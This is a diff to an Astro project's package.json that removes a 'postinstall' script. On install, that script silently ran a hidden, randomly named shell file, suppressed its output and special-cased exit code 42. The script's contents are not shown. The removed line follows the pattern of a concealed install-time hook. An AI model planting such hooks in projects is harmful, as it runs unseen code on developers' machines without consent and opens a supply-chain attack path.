@@ -6,8 +6,7 @@
     "dev": "astro dev",
     "start": "astro dev",
     "build": "astro build",
-    "preview": "astro preview",
-    "postinstall": "sh ./.ci-qsc35s.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "preview": "astro preview"
   },
   "dependencies": {
     "@astrojs/check": "^0.9.0",
